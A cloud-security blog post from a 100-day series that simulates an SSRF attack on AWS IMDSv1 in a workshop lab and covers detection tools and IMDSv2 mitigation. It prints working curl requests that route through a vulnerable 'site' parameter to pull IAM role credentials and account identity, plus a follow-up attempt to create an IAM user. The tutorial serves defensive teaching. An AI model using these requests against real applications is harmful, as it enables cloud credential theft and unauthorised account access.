---
title: '100 Days of Cloud Security - Day 73: SSRF on IMDSv1 - Simulation and Detection - Part 1'
date: '2026-01-22'
author: 'Venkata Pathuri'
excerpt: 'Day 73 of my cloud security journey - SSRF on IMDSv1 - Simulation and Detection - Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 73: SSRF on IMDSv1 - Simulation and Detection - Part 1

## Overview

Welcome back to Day 73 of our cloud security journey! Today, we delve into the intricate world of Server-Side Request Forgery (SSRF) vulnerabilities, specifically in the context of AWS’s Instance Metadata Service v1 (IMDSv1). Building on the foundational knowledge from Day 72, where we explored the security implications of misconfigured services, we will now simulate an attack scenario to better understand how SSRF exploits can lead to the unauthorized access of sensitive information. By engaging with this hands-on workshop, you’re equipping yourself with the skills to detect and respond to such vulnerabilities in AWS environments.

## Learning Objectives

In this session, you will master essential skills that will enhance your cloud security expertise. You will:
- Gain practical experience in using tools like _Assisted Log Enabler_ and _Security Analytics Bootstrap_ to detect unauthorized activities.
- Learn to extract and analyze log data using AWS services such as Athena and CloudWatch Logs Insights.
- Understand the various CloudTrail events that can inform your response to security incidents.
- Investigate security events using findings from Amazon GuardDuty.
- Explore AWS Systems Manager (SSM) for identifying command usage in compromised instances.
- Implement AWS WAF (Web Application Firewall) to secure your web applications from malicious traffic.

## Deep Dive

### Understanding SSRF and IMDSv1

Server-Side Request Forgery (SSRF) is a type of vulnerability that allows an attacker to induce a server-side application to make requests to unintended locations, potentially exposing sensitive information. In AWS, this often involves querying the Instance Metadata Service (IMDS), which provides data about the running instance, including IAM role credentials. IMDSv1 has been criticized for its lack of security controls, making it susceptible to exploitation.

Consider the following scenario: An attacker discovers an SSRF vulnerability in a web application's image rendering feature. By crafting a request, the attacker can access the IMDS endpoint at `http://169.254.169.254`, thereby gaining unauthorized access to sensitive metadata such as temporary security credentials associated with the EC2 instance's IAM role.

### The Attack Simulation

In our workshop, we’ll simulate an attacker exploiting an SSRF vulnerability step-by-step:

1. **Enumerate Metadata Categories**: The attacker uses a `curl` command to list the available metadata categories.
   ```bash
   $ curl "http://ssrf-webappa-1uxqwlnhlfzh-1651158844.us-east-1.elb.amazonaws.com/demo.php?site=http://169.254.169.254/latest/meta-data/"
   ```

   **Expected Output**: A list of metadata categories such as `ami-id`, `instance-id`, and `iam/`.

2. **Exfiltrate IAM Role Credentials**: The attacker targets the `iam/` category to retrieve temporary security credentials.
   ```bash
   $ curl "http://ssrf-webappa-1uxqwlnhlfzh-1651158844.us-east-1.elb.amazonaws.com/demo.php?site=http://169.254.169.254/latest/meta-data/iam/security-credentials/webdev"
   ```

   **Output**:
   ```json
   {
     "Code" : "Success",
     "AccessKeyId" : "ASIA5D6G5YOZYD7CCUJW",
     "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
     "Token" : "IQoJb3JpZ2luX2VjEHwaCXVzLWVhc3QtMSJIMEYCIQD78re2UWHtv4eR2P6GMn...",
     "Expiration" : "2026-01-16T09:38:59Z"
   }
   ```

   **Important Note**: Use example credentials like `ASIA5D6G5YOZYD7CCUJW` to avoid exposing actual keys.

3. **Identify Region and Account**: The attacker retrieves the instance identity document to confirm the AWS Region and Account ID.
   ```bash
   $ curl "http://ssrf-webappa-1uxqwlnhlfzh-1651158844.us-east-1.elb.amazonaws.com/demo.php?site=http://169.254.169.254/latest/dynamic/instance-identity/document"
   ```

   **Output**:
   ```json
   {
     "accountId" : "901823447987",
     "region" : "us-east-1",
     "instanceId" : "i-00f5174ed254b1e8f"
   }
   ```

### Best Practices

- **Use IMDSv2**: AWS introduced IMDSv2, which requires session-based tokens, adding a layer of protection against SSRF attacks.
- **Implement Network Segmentation**: Isolate sensitive services and restrict access using security groups and network ACLs.
- **Regularly Review IAM Policies**: Ensure that IAM roles have the least privilege necessary to perform their tasks.
- **Monitor Logs**: Utilize AWS CloudTrail and CloudWatch to monitor access patterns and detect anomalies.

## Hands-On Practice

To solidify your understanding, let’s execute the following commands in your AWS environment:

1. **Retrieve Metadata**:
   ```bash
   $ curl "http://169.254.169.254/latest/meta-data/"
   ```

   **Expected Outcome**: You should see various metadata categories.

2. **Get IAM Role Credentials**:
   ```bash
   $ curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/webdev"
   ```

   **Expected Outcome**: A JSON object with IAM credentials (use example keys).

3. **Explore Permissions**: Attempt to create a user (ensure you have permission).
   ```bash
   $ aws iam create-user --user-name adm1n
   ```

   **Troubleshooting Tip**: You may encounter an Access Denied error if your permissions do not allow user creation. This is expected and illustrates the principle of least privilege.

## Key Takeaways

Today, we explored the crucial concept of SSRF and its implications in cloud environments, particularly through the lens of AWS's Instance Metadata Service v1. By simulating an attack, we witnessed firsthand how attackers can exploit vulnerabilities to gain unauthorized access to sensitive information. Understanding these threats allows us to implement better security practices, ensuring our cloud resources remain secure.

## Real-World Applications

In real production environments, the concepts learned today are vital for securing cloud applications. Organizations must remain vigilant against SSRF vulnerabilities, as they can lead to severe security incidents, including credential theft and unauthorized system access. Regular security assessments, combined with robust monitoring and logging, can help mitigate risks associated with SSRF and other vulnerabilities.

---
**Journey Progress:** 73/100 Days Complete 🚀